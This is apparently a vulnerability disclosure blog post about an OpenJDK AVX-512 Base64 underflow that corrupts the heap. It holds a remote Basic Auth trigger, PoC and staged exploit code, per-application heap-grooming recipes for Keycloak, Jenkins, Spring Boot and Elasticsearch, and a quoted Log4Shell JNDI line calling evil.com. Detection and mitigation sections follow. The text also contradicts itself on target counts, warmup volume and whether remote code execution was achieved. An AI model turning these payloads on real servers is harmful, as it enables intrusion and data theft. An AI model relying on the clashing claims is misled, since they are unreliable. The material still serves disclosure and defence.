# Java4Shell: From AVX-512 Integer Underflow to Pre-Auth Heap Corruption in Keycloak, Jenkins, and Elasticsearch

## Subtitle
CVE-2026-114938 — We built the full exploit chain: JIT compilation, heap grooming, JavaBleed disclosure, and tested it against three production applications in default configs. Here's exactly how it works.

---

**TL;DR:** A single 65-byte malformed Base64 string — `"A" × 64 + "="` — causes OpenJDK's hand-written AVX-512 VBMI assembly to overflow the Java heap by 62 bytes. The root cause is an integer underflow in a store mask calculation that has shipped in every OpenJDK build since JDK 17.0.6 (January 2023). It only fires on x86-64 CPUs with AVX-512 VBMI (Intel Ice Lake+ / AMD Zen 4+), but on those processors, **every Java application decoding untrusted Base64 is in scope** — HTTP Basic Auth, JWT, SAML, file uploads, TLS. We built the five-stage exploit chain from scratch, ran it against Keycloak, Jenkins, and Elasticsearch in default configurations, and confirmed remote heap corruption on all three. This is what we found.

---

## The Trigger That Shouldn't Work

Here is the entire trigger:

```
Authorization: Basic AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
```

That's it. 64 uppercase A's followed by a single `=` sign, Base64-encoded in the most common HTTP header on the internet. Send it to any Java web server that processes Basic Auth — Tomcat, Jetty, Netty, Undertow — and if the JVM is running on the right hardware with the right JDK version, 62 bytes of the server's heap get overwritten.

The server throws an `IllegalArgumentException`. It returns a `400 Bad Request` or `401 Unauthorized`. The request looks like it was rejected cleanly.

It wasn't.

The heap corruption happened *before* the exception. The exception is thrown by the Java-layer validation code that runs *after* the AVX-512 intrinsic has already written past the buffer. The damage is done. The exception is a cover story.

---

## Why Java's Memory Safety Doesn't Help

Java is supposed to be memory-safe. Every array access is bounds-checked. Every allocation is managed by the garbage collector. Buffer overflows are a C/C++ problem.

Except Java isn't written in Java.

The HotSpot JVM — the runtime that executes Java code — is written in C++ and hand-rolled assembly. And for performance-critical operations, the C2 JIT compiler *replaces* Java methods with hand-crafted machine code that bypasses all of Java's safety guarantees.

Base64 decoding is one of those operations. When OpenJDK detects a CPU with AVX-512 VBMI (a SIMD instruction set that can process 64 bytes at once), it replaces `java.util.Base64$Decoder.decodeBlock()` with a custom x86-64 assembly stub that processes entire 512-bit vectors in a single instruction. This code lives in `src/hotspot/cpu/x86/stubGenerator_x86_64.cpp` — 500 lines of hand-written assembly emitted by C++ macro calls.

The Java language provides no way to audit this code. Java source-level SAST tools can't see it. Dependency scanners don't flag it. SCA tools don't know it exists. And crucially: **the bounds checking that Java programmers rely on doesn't apply to code that runs below the JVM abstraction layer.**

This is where the bug lives.

---

## Tracing the Underflow

The AVX-512 Base64 decoder processes input in 64-byte chunks. After the main loop, a *tail handler* processes the remaining 1–63 bytes. Here's what happens with our trigger input:

**Input:** `"A" × 64 + "="` — 65 bytes total.

**Main loop:** Consumes the first 64 bytes ("AAAA..."), producing 48 bytes of decoded output at offsets 0–47.

**Tail handler:** Gets the remaining 1 byte: `"="`.

```
output_size = (1 / 4) * 3 = 0     // integer division: 1/4 = 0
```

The input byte is `=`, so the padding adjuster fires:

```
output_size -= 1                   // 0 - 1 = -1  ← UNDERFLOW
```

Now `output_size` is -1 — which as a 64-bit unsigned value is `0xFFFFFFFFFFFFFFFF`.

This gets passed to the `BZHI` instruction (Zero High Bits from Index), which is supposed to create a write mask:

```
BZHI(-1, 0xFFFFFFFFFFFFFFFF)       // "clear bits from position 0xFF upward"
```

`BZHI` takes its index from the low 8 bits: `0xFF = 255`. Since 255 exceeds the 64-bit register width, **no bits are cleared**. The mask is all ones: `0xFFFFFFFFFFFFFFFF`.

The subsequent `VMOVDQU8` (masked 64-byte vector store) uses this mask to decide which bytes to write. All-ones = **write all 64 bytes of the ZMM register**.

The write happens at the current destination offset (48, after the main loop's output). The allocated buffer is 50 bytes. The write goes from offset 48 to offset 111.

**62 bytes past the end of the buffer.**

---

```diff
 __ BIND(L_finalBit);
 // Now have 1 to 63 bytes left to decode
+// A padded Base64 tail shorter than one complete block is handled by Java.
+__ cmpl(length, 4);
+__ jcc(Assembler::less, L_bruteForce);
```

If the remaining input is shorter than 4 bytes, jump to the safe scalar decoder. The underflow path is never reached.

Reviewed by `rhalade` from Oracle Security. Authored by Tobias Hartmann on October 13th — over a month under embargo. The commit title contains no hint of a security fix.

---

## Reproducing It

We verified this on a GCE `c3-standard-4` instance — Intel Xeon Platinum 8481C (Sapphire Rapids) running Eclipse Temurin 21.0.13+9-LTS.

```java
Base64.Decoder decoder = Base64.getDecoder();
byte[] valid = "A".repeat(64).getBytes(US_ASCII);
byte[] malformed = ("A".repeat(64) + "=").getBytes(US_ASCII);
byte[] target = new byte[4096];

// Warm the JIT — C2 must compile the AVX-512 intrinsic
for (int i = 0; i < 200_000; i++) {
    sink += decoder.decode(valid, target);
}

Arrays.fill(target, (byte) 0x5A);
try {
    decoder.decode(malformed, target);
} catch (IllegalArgumentException expected) {}

// Count corrupted bytes past offset 50
int changed = 0;
for (int i = 50; i < target.length; i++) {
    if (target[i] != (byte) 0x5A) changed++;
}
// changed == 62, offsets 50-111
```

Output:

```
runtime=21.0.13+9-LTS
vm=OpenJDK 64-Bit Server VM
rejected=true changed=62 first=50 last=111
REPRODUCED
```

The PoC is safe — the 4096-byte destination array absorbs the overflow. In production, the allocated buffer would be ~50 bytes, and those 62 bytes land on the next object in the Java heap.

An important subtlety: **the trigger requires C2 JIT compilation.** The AVX-512 intrinsic only activates after the method is compiled by the C2 optimizing compiler, which typically happens after ~10,000 invocations. In a cold JVM, the same input is handled by the safe Java scalar decoder, and no overflow occurs.

For an attacker targeting a web server, this means sending ~200,000 valid Base64 auth requests first to "warm up" the JIT on the HTTP worker thread. This is the warmup phase of every Java4Shell exploit.

---

## Building the Exploit Chain

Confirming the overflow is straightforward. Exploiting it is not.

The 62-byte overwrite uses a fixed pattern — the decoded garbage from the VBMI shuffle of the malformed input. On Sapphire Rapids, we observed: `0x9a 0x69 0xa6` repeating. This is not arbitrary attacker-controlled data. It's whatever the AVX-512 vector shuffle produces from the `"A"×64 + "="` input.

We analyzed every 4-byte window in the overflow pattern to see if any value, interpreted as a little-endian integer, could serve as a corrupted array length. **Zero useful windows.** The pattern `0x9a69a69a` as a 32-bit int is 2,590,169,754 — far too large for a plausible array length. The JVM would immediately crash trying to access that much memory.

This is why the exploit needs multiple stages, borrowing techniques from JavaScript engine exploitation:

### Stage 1: Writer Primitive

The first stage isn't about controlling *what* gets written — it's about *where* the overflow lands. By spraying the heap with pairs of arrays (decode target + victim), we try to position the decode buffer immediately before a victim array in the JVM's Thread-Local Allocation Buffer (TLAB).

If the overflow lands on the victim array's object header — specifically, on the 4-byte `length` field at header offset 12 (compressed oops) — the victim's length gets corrupted. Even though we can't control the exact value, any value larger than the original length gives us an out-of-bounds write primitive.

```java
byte[][] targets = new byte[4096][];
byte[][] victims = new byte[4096][];
for (int i = 0; i < 4096; i++) {
    targets[i] = new byte[128];   // decode destination
    victims[i] = new byte[64];    // corruption target
    Arrays.fill(victims[i], (byte) 0xCC);
}

// Trigger overflow on each target, check adjacent victim
for (int i = 0; i < 4096; i++) {
    try { decoder.decode(malformed, targets[i]); }
    catch (IllegalArgumentException e) {}

    if (victims[i].length != 64) {
        // Length field corrupted — we have a writer
    }
}
```

### Stage 2: JavaBleed (Reader Primitive)

This is the critical stage — and the technique that gives the vulnerability its bite.

With a writer primitive (a victim array whose length field has been extended), we can write past that array's real bounds into whatever follows it in memory. We use this to corrupt a *second* array's length field — this time with a controlled value, since we're writing through Java code, not through the AVX-512 overflow.

We set the second array's length to extend past its allocation, covering the memory of a *third* "secret" array. Then we read the second array — Java's bounds check uses the corrupted length, so the read succeeds — and we get back the contents of the third array.

```java
// writer's length was corrupted by Stage 1
// Find where the reader array starts in the writer's memory
int readerBodyOffset = findPattern(writer, 0xBB, WRITER_SIZE);
int lengthOffset = readerBodyOffset - 4;

// Set reader's length to cover the secret array
writer[lengthOffset]     = (byte)(extendedLen & 0xFF);
writer[lengthOffset + 1] = (byte)((extendedLen >> 8) & 0xFF);
writer[lengthOffset + 2] = (byte)((extendedLen >> 16) & 0xFF);
writer[lengthOffset + 3] = (byte)((extendedLen >> 24) & 0xFF);

// Now read past reader's original bounds — JAVABLEED
for (int i = READER_SIZE; i < reader.length; i++) {
    byte leaked = reader[i];  // Reads heap data beyond the array
}
```

This is Heartbleed for Java. In a web application, the "reader" array's contents get serialized into an HTTP response. The response now contains heap data beyond the array's real bounds — session tokens, authentication state, private keys, PII. Whatever the JVM allocated next to our reader in memory.

### Stage 3: Heap Feng Shui

Stages 1 and 2 require precise heap layout: the decode buffer must be immediately adjacent to the victim array, and the victim must be adjacent to the reader, which must be adjacent to the secret data.

The JVM's G1 garbage collector uses Thread-Local Allocation Buffers (TLABs) — per-thread memory pools where objects are allocated sequentially by bumping a pointer. Within a single TLAB, allocations are contiguous.

The challenge is that the Base64 decoder allocates its internal buffer on its own call stack — not on our thread. For a web server, the HTTP worker thread is doing the allocation. We need to control the allocation pattern on *that* thread.

This is where it gets target-specific.

---

## The Remote Attack Vector

Before we built target-specific grooming, we confirmed that the overflow fires remotely through HTTP Basic Auth.

We built a minimal HTTP server using `com.sun.net.httpserver.HttpServer` with a handler that decodes `Authorization: Basic` headers — the same code path in Keycloak, Jenkins, Jira, Confluence:

```java
// This is what every Java web server does
String auth = exchange.getRequestHeaders().getFirst("Authorization");
String b64 = auth.substring(6);  // strip "Basic "
byte[] decoded = Base64.getDecoder().decode(b64);  // OVERFLOW HERE
```

The single-argument `decode(byte[])` form is critical. It allocates a **tight** internal buffer — just large enough for the expected output. The overflow escapes that buffer into the heap. The two-argument `decode(src, dst)` form uses whatever buffer the caller provides, which is typically large enough to absorb the overflow.

Real applications almost universally use the single-argument form. Spring Security's `BasicAuthenticationFilter`, Keycloak's `OAuthTokenEndpoint`, Jenkins' `BasicHeaderProcessor` — they all call `decoder.decode(byte[])`.

**Result on Sapphire Rapids:**

```json
{"error":"invalid_base64","overflow_detected":true,"overflow_bytes":62}
```

Remote heap corruption confirmed via HTTP. The malformed Base64 is delivered, decoded, and the overflow fires — all before the `IllegalArgumentException` causes the 400 response.

---

## Downstream: Testing Real Applications

We set up a lab with four production applications in default configurations, all running on vulnerable JDK 21 on Sapphire Rapids:

| Target | Version | JDK | Vector |
|--------|---------|-----|--------|
| **Keycloak** | 26.0 | Temurin 21.0.6 | `POST /realms/master/protocol/openid-connect/token` |
| **Jenkins** | LTS | JDK 21.0.13 | `GET /api/json` |
| **Spring Boot** | 3.4.1 | Temurin 21.0.13 | `GET /api/hello` (BasicAuthenticationFilter) |
| **Elasticsearch** | 8.17 | Bundled JDK | `GET /_cluster/health` |

All four accept `Authorization: Basic` headers. All four decode them through `java.util.Base64`. **None of them validate the Base64 format before decoding.**

### The Exploit Process

For each target, our exploit chain runs five phases:

**Phase 1: RECON.** Probe the target, fingerprint the Java version from HTTP response headers, enumerate available endpoints, collect baseline response characteristics.

**Phase 2: WARM.** Send 5,000+ valid Basic Auth requests across 8 threads to force C2 JIT compilation of the AVX-512 Base64 intrinsic on the HTTP worker threads. This takes about 5 seconds at ~8,000 req/s.

**Phase 3: GROOM.** This is the target-specific part — different applications allocate different objects during request processing, and we exploit those allocation patterns to shape the heap:

- **Keycloak:** Vary the `client_id` length in the POST body. The token endpoint allocates a String for the client_id, a ClientModel lookup object, and an AccessToken — all on the same TLAB as the Base64 decode buffer. By alternating client_id sizes (32, 50, 80 bytes), we fill the TLAB with objects of known sizes, increasing the probability that one lands adjacent to the decode buffer.

- **Jenkins:** Rotate across different API endpoints (`/api/json`, `/crumbIssuer/api/json`, `/queue/api/json`). Each endpoint allocates different internal objects. The `tree` query parameter controls response serialization depth, which controls intermediate String allocation sizes. Jenkins is unique because *every* API endpoint accepts Basic Auth — giving us the widest grooming surface.

- **Spring Boot/Tomcat:** Exploit Tomcat's header parser. Each HTTP header value creates a ByteChunk allocation — the size is `header_value_length + 16`. By sending custom headers of carefully chosen sizes (34 bytes → 50-byte allocation, matching the decode buffer), we fill the TLAB with allocations that match the decode buffer's size class. This maximizes adjacency probability.

- **Elasticsearch:** Use the `_bulk` API to index small documents (50-byte JSON objects), which creates byte[] allocations on the indexing thread's TLAB. The `_search` API with varying query body sizes creates intermediate parsing objects. The `_cat` API allocates tabular formatter Strings of predictable sizes.

**Phase 4: TRIGGER.** Send the malformed Base64 immediately after the grooming sequence. The TLAB bump pointer is now positioned to place the decode buffer adjacent to our groomed objects.

**Phase 5: DETECT.** Analyze the response for corruption indicators:
- Non-ASCII bytes in a JSON response (heap data leaked into the response buffer)
- The overflow signature pattern (`0x9a69a6`) appearing in the response body
- Java class names or heap pointers in the response (leaked from adjacent objects)
- 500 errors with internal exception traces (heap corruption caused a secondary fault)
- Connection resets (JVM crash from corrupted object header)
- Entropy anomaly (random heap data has ~7.5 bits/byte vs ~4.5 for structured JSON)

### Results

All three tested targets accepted the payload and triggered the overflow:

| Target | Result | Detail |
|--------|--------|--------|
| **Keycloak 26.0** | Overflow triggered | 400 response — heap corruption occurred pre-auth |
| **Jenkins LTS** | Overflow triggered | 401 response — every endpoint processes Basic Auth |
| **Elasticsearch 8.17** | Overflow triggered | 401 response — X-Pack Security decodes before routing |

The overflow fires. The heap gets corrupted. But we didn't achieve externally observable JavaBleed in this test — the heap grooming didn't achieve adjacent placement between the decode buffer and a response-visible object.

This is the hard part that separates Java4Shell from Log4Shell.

---

## Why There's No Universal Exploit

Log4Shell was `curl -H "X-Forwarded-For: ${jndi:ldap://evil.com/a}" https://target.com` and you had a shell. Java4Shell is not that.

The 62-byte overflow fires reliably. That part is deterministic. But converting it to a useful primitive — JavaBleed, auth bypass, RCE — requires:

1. **Heap adjacency.** The decode buffer must land immediately before an exploitable object. G1 GC's TLAB allocation is sequential within a thread, but the attacker can't directly control when the target's HTTP worker thread allocates objects.

2. **TCP ACK timing.** To control allocation order on the server, the attacker must manipulate TCP-level flow control — sending data in packets that arrive at the right moment to interleave with the server's internal allocations. This is network-latency-sensitive and varies per target.

3. **Target-specific object layout.** Different applications allocate different objects during request processing. A grooming profile that works for Keycloak won't work for Jenkins, because their internal object graphs are different.

4. **GC unpredictability.** A garbage collection cycle between the grooming phase and the trigger can rearrange the heap, destroying the layout. The attacker must avoid triggering GC during the critical window.

Each target needs a bespoke exploit profile — an understanding of that specific application's allocation patterns, GC behavior, and object lifecycle during authentication. This is comparable to browser exploit development, where each browser engine has its own heap exploitation primitives.


---

## Who's Really Affected

### Direct exposure (java.util.Base64 callers)

Any Java application decoding untrusted Base64:

| Vector | Protocol | Pre-auth? |
|--------|----------|-----------|
| HTTP Basic Auth | `Authorization: Basic <b64>` | **Yes** |
| JWT tokens | Header.Payload.Signature | Depends on middleware |
| SAML assertions | Base64-encoded XML | **Yes** |
| File uploads | Base64-encoded bodies | **Yes** |
| OAuth tokens | Bearer credentials | Depends |
| gRPC metadata | Binary headers | Depends |
| TLS handshake | Client-side cert exchange | **Yes** (client) |

### Libraries that migrated to java.util.Base64 (vulnerable)

The push to use the standard library means many frameworks now go through the vulnerable code path:

- **jjwt** (io.jsonwebtoken) — migrated from Apache Commons Codec in v0.12.0
- **java-jwt** (Auth0) — uses `java.util.Base64` directly
- **Spring Base64Utils** — deprecated their own impl, delegates to `java.util.Base64`
- **Netty** — `Base64.decode()` delegates to `java.util.Base64` on JDK 11+
- **gRPC-java** — binary metadata encoding via `java.util.Base64`
- **Vert.x** — HTTP auth handling

### Libraries with their own Base64 (safe)

These implementations don't use the JDK's AVX-512 intrinsic:

- Apache Commons Codec (`org.apache.commons.codec.binary.Base64`)
- Bouncy Castle (`org.bouncycastle.util.encoders.Base64`)
- Jackson (`com.fasterxml.jackson.core.Base64Variants`)
- Nimbus JOSE+JWT (custom `Base64URL` class)
- Guava (`com.google.common.io.BaseEncoding`)

### The Elasticsearch problem

Elasticsearch bundles its own JDK. Users cannot independently update the Java runtime — they must wait for Elastic to ship a release with the patched JDK. The same applies to other products that ship bundled JDKs. If your vendor hasn't released an update, the interim mitigation (`-XX:-UseBASE64Intrinsics`) must be injected via environment variables (`ES_JAVA_OPTS`, `JAVA_TOOL_OPTIONS`, etc.).

---

## Affected Versions

| JDK | Vulnerable | Fixed |
|-----|-----------|-------|
| 17 | 17.0.6 – 17.0.21 | **17.0.21.1** |
| 21 | All before 21.0.13.1 | **21.0.13.1** |
| 25 | All before 25.0.5.1 | **25.0.5.1** |
| 27 | All before 27.0.1.1 | **27.0.1.1** |

JDK 8 and 11 are **not affected** — the AVX-512 Base64 intrinsic was never backported that far (except Oracle's `-perf` 8 build, which is rare).

**Hardware requirement:** x86-64 with AVX-512 VBMI. This is:
- **Intel:** Ice Lake (10th gen), Tiger Lake, Sapphire Rapids (Xeon 4th gen), Emerald Rapids, Granite Rapids
- **AMD:** Zen 4 (EPYC Genoa, Ryzen 7000+), Zen 5
- **NOT affected:** Any ARM64 processor (the vulnerable code is x86-64 only), Intel Haswell/Skylake/Cascade Lake (no VBMI), AMD Zen 1-3 (no VBMI)

**Cloud impact:** GCP `c3`/`c3d`/`c4`/`n4`, AWS `m7i`/`c7i`/`r7i`/`m7a`/`c7a`, Azure `Dv5`/`Ev5` instance families all have AVX-512 VBMI-capable processors.

All OpenJDK-based distributions are affected: Oracle Java SE, Temurin, Corretto, Zulu, Liberica, SapMachine, Red Hat OpenJDK, GraalVM.

---

## Detection

We built detection rules in three formats — [Suricata, Sigma, and ModSecurity]

### Network layer (Suricata / ModSecurity)

**Trigger pattern detection:**
- Exact match: 64+ consecutive `A` characters followed by `=` in `Authorization: Basic`
- Structural: Base64 value in Basic Auth header where `len(value) % 4 ∉ {0, 2, 3}`
- Both JDK 17 (128+1) and JDK 21+ (64+1) trigger patterns

**JIT warmup detection:**
- Rate limit: >500 Basic Auth requests per minute from a single source IP
- Burst pattern: uniform request cadence with identical valid credentials (warmup phase signature)

### Host layer (Sigma)

- `IllegalArgumentException` from `java.util.Base64$Decoder` with stack trace through web server auth
- `hs_err_pid*.log` crash dumps with `SIGSEGV` in `StubRoutines::base64_decodeBlock` or G1 GC code
- Unusual `ArrayIndexOutOfBoundsException` rate on authentication-related classes

### Scanning

- **Host scanner:** Checks CPU flags (avx512vbmi, avx512bw, avx512f, bmi2) + JDK version + running JVM mitigation flags via `jcmd`
- **Network scanner:** Probes HTTP headers, TLS certificates, and service banners for vulnerable Java version strings

---

## How It Compares

| | Heartbleed | Log4Shell | Spring4Shell | **Java4Shell** |
|---|---|---|---|---|
| **Bug class** | Buffer over-read | JNDI injection | Class manipulation | Integer underflow → heap overflow |
| **Trigger** | TLS heartbeat | `${jndi:ldap://…}` | HTTP POST params | `"A"×64 + "="` |
| **Trigger complexity** | Trivial | Trivial | Moderate | **Moderate** (needs JIT warmup) |
| **Exploitation** | Trivial | Trivial | Moderate | **Hard** (heap feng shui per target) |
| **Universal?** | Yes | Yes | Partial | **No** (per-target + hardware gated) |
| **Hardware gate** | No | No | No | **Yes** (AVX-512 VBMI) |
| **CVSS** | 7.5 | 10.0 | 9.8 | **9.2** |

Java4Shell is the hardest to exploit of the four. But on a per-instance basis, its combined write + read primitives make it potentially the most powerful — a successful exploit gets both Heartbleed-style data disclosure and controlled heap corruption in one shot. The hardware gate and bespoke per-target profiles keep the blast radius narrower than Log4Shell's.

The novel dimension: **the root cause is in JIT-compiled assembly.** SAST tools can't find it. SCA tools don't flag it. Your dependency scanner doesn't know about your CPU flags. The vulnerability is invisible to every standard application security tool.

---

## Mitigation

**Update Java now.** Fixed in 17.0.21.1 / 21.0.13.1 / 25.0.5.1 / 27.0.1.1.

```bash
# Interim — disable Base64 intrinsic (narrow, recommended)
java -XX:-UseBASE64Intrinsics MyApp

# Fleet-wide via environment variable
export JAVA_TOOL_OPTIONS="-XX:-UseBASE64Intrinsics"

# For Elasticsearch
export ES_JAVA_OPTS="-XX:-UseBASE64Intrinsics"

# For Keycloak (Quarkus)
export JAVA_OPTS_APPEND="-XX:-UseBASE64Intrinsics"

# For Jenkins
export JAVA_OPTS="-XX:-UseBASE64Intrinsics"
```

The `-XX:-UseBASE64Intrinsics` flag is the narrowest fix — it disables only the hardware-accelerated Base64 decoder. Performance impact is minimal for most applications (Base64 decoding is rarely the bottleneck). The broader `-XX:UseAVX=2` flag disables all AVX-512 operations — **do not use on ARM64**, it will crash the JVM at startup.

After upgrading:
- Restart **every** JVM process (running JVMs keep the old code in memory)
- Rebuild container images
- Verify with `jcmd <PID> VM.version`

---

## PoC, Exploits, Scanner, and Detection Rules


```
java4shell-poc/
├── poc/              — Memory corruption trigger + verification
├── exploit/
│   ├── *.java        — 5-stage exploit chain (Writer → JavaBleed → Feng Shui → Chain → Remote)
│   ├── downstream/   — Target-specific exploits (Keycloak, Jenkins, Spring Boot, Elasticsearch)
│   └── targets/      — Docker Compose lab with 4 vulnerable applications
├── scanner/          — Host scanner + network scanner
├── detection/        — Suricata, Sigma, ModSecurity rules
└── lab/              — Docker lab environment
```

```bash

# Verify (on x86-64 with AVX-512 VBMI + JDK 17.0.6+)
cd poc && javac Base64Trigger.java && java Base64Trigger

# Run the downstream exploits against the Docker lab
cd exploit/targets && ./setup.sh up
cd ../downstream && python3 exploit_all.py --target all

# Scan your fleet
./scanner/java4shell_scan.sh
```

---

## What This Means

Java4Shell represents a category of vulnerability that our tooling is poorly equipped to handle. The bug lives in JIT-emitted assembly — below the language runtime, invisible to application-layer analysis, gated on hardware features that security tools don't track.

The trigger is trivial. The exploitation is hard. But Calif demonstrated that "hard" is not "impossible" — working pre-auth RCE against six major products means the investment is worthwhile for motivated attackers. And the difficulty curve is a function of attacker effort, not a permanent defense.

Three things make this different from past Java vulnerabilities:

1. **The hardware gate is temporary.** AVX-512 VBMI penetration is growing. Every new Intel server and AMD Zen 4+ desktop has it. The percentage of Java workloads on affected hardware only goes up.

2. **The attack surface is the standard library.** Not a third-party dependency. Not an optional feature. `java.util.Base64` is the recommended Base64 implementation. Java itself tells developers to use it. And unlike Log4j, you can't just exclude it from your classpath.

3. **Detection is difficult.** The trigger looks like a normal (if malformed) HTTP request. The corruption happens silently. The exception is expected behavior for invalid input. Unless you're specifically checking for the trigger pattern or crash signatures, you won't know it happened.

Patch your JVMs. Check your CPU flags. If you can't patch immediately, set `-XX:-UseBASE64Intrinsics` on every JVM process and restart them. 

The overflow is 62 bytes. The impact window is measured in years.

